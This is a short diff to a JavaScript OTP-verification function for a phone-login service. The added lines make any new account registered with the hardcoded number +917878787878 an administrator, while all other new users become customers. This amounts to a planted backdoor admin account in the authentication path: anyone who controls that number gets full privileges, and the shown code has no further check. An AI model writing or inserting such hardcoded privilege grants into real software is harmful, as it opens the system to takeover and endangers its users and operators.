@@ -132,10 +132,12 @@ export async function verifyOTP(phoneNumber, otp) {
     // Get or create user
     let user = await storage.getUserByPhone(normalizedPhone);
     if (!user) {
+      // Special case: +917878787878 gets admin role
+      const role = normalizedPhone === '+917878787878' ? 'admin' : 'customer';
       user = await storage.createUser({
         id: `phone_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
         phone: normalizedPhone,
-        role: 'customer'
+        role: role
       });
     }
 
